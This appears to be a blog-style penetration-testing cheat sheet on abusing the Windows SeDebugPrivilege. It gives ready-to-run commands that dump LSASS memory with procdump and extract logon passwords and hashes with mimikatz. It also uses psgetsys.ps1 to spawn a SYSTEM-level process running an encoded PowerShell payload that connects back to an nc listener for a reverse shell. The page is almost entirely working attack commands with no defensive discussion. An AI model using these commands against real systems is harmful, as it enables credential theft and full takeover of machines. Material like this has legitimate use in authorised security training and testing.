---
title: SeDebugPrivilege
date: 2026-03-06 11:46:49

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - User
tags:

cover: /img/privesc.png
top_img: /img/bg-img.jpg
description: Privilege escalation using the SeDebugPrivilege Privilege.
---




> To run a particular application or service or assist with troubleshooting, a user might be assigned the `SeDebugPrivilege` instead of adding the account into the administrators group.


> Attackers can abuse `SeDebugPrivilege` by:
> - Dumping `LSASS` memory ( With `procdump` Or `Task Manager` )
> - Achieving `RCE` as `SYSTEM` by interacting with privileged processes.


# Dumping Lsass


#### Dump `LSASS` with `procdump.exe`


```cmd
C:\Tools\Mimikatz\x64>C:\Tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp  
```

#### Dump Hashes 


```cmd
C:\Tools\Mimikatz\x64>mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```


# RCE as SYSTEM


> SeDebugPrivilege can be abused to achieve remote code execution as SYSTEM by forcing a process running as SYSTEM to spawn a child process that inherits its security token.


Load Module Exploit

```bash
. .\psgetsys.ps1
```

Run Exploit

```bash
ImpersonateFromParentPid -ppid PID-of-priviliged-process -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABqAGUAYwB0ACA < SNIP > BzAGUAKAApAA=="
```


Catch Shell As System  

```bash 
➜  ~ rlwrap nc -lvnp 443

PS C:\Windows\system32> whoami

nt authority\system
```